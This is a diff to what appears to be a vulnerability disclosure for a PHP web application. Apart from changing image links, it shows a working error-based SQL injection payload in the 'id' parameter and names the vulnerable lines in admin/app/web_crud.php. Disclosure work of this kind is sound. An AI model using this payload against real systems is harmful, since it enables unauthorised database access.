@@ -24,13 +24,13 @@ Content-Length: 298
 update3=yes&encryption=1&host=1&port=1&username=1&password=2&email=1&id=1' AND (SELECT * FROM(SELECT COUNT(*),CONCAT(0x01,(SELECT MID((IFNULL(CAST(schema_name AS NCHAR),0x20)),1,54) FROM INFORMATION_SCHEMA.SCHEMATA LIMIT 6,1),0x00,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- 
 ```
 
-![1](/img/8.png)
+![1](https://github.com/xuanluansec/vul/blob/main/vul/img/8.png)
 
 Running this payload will reveal the name of the database. This indicates that SQL injection vulnerability has been successfully executed in the database, allowing for database querying. Apart from error-based injection, there also exists time-based blind injection, boolean-based blind injection, and stacked query injection vulnerabilities.
 
-![2](/img/10.png)
+![2](https://github.com/xuanluansec/vul/blob/main/vul/img/10.png)
 
 The parameter "id" received on line 225 of the web_crud.php file in the "admin/app" directory of the website is vulnerable to being controlled by guest users, and then it is executed on line 227, causing a SQL injection vulnerability.
 
 web_crud.php
-![2](/img/9.png)
+![2](https://github.com/xuanluansec/vul/blob/main/vul/img/9.png)
